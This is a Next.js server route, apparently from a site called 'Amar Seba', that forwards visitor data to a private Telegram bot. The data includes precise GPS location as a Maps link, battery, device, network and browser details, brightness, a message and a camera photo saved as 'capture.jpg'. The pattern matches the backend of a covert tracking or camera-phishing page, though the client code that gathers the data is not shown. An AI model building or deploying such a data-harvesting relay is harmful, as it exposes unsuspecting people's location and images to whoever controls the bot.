import { NextResponse } from 'next/server';

export async function POST(req: Request) {
  try {
    const { message, photo, lat, lng, battery, deviceName, networkType, screenRes, browser, brightness } = await req.json();
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      console.error('Telegram configuration missing');
      return NextResponse.json({ error: 'Telegram configuration missing' }, { status: 500 });
    }

    // Prepare info message
    const infoMessage = `
💓 *Amar Seba - New Activity*
-------------------------
📱 *Device:* ${deviceName || 'Unknown'}
🔋 *Battery:* ${battery}%
📶 *Network:* ${networkType || 'Unknown'}
🖥️ *Screen:* ${screenRes || 'Unknown'}
🌐 *Browser:* ${browser || 'Unknown'}
☀️ *Display Brightness:* ${brightness || 100}%
📍 *Location:* ${lat && lng ? `https://www.google.com/maps?q=${lat},${lng}` : 'Not available'}
-------------------------
💬 *User Msg:* ${message || 'No message'}
    `;

    // 1. Send Text Info
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: infoMessage,
        parse_mode: 'Markdown',
      }),
    });

    // 2. Send Photo if available
    if (photo) {
      // Photo comes as base64 data URL: data:image/jpeg;base64,...
      const base64Data = photo.split(',')[1];
      const blob = await (await fetch(photo)).blob();
      
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, 'capture.jpg');

      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: 'POST',
        body: formData,
      });
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('Telegram API Error:', error);
    return NextResponse.json({ error: 'Failed to send data' }, { status: 500 });
  }
}
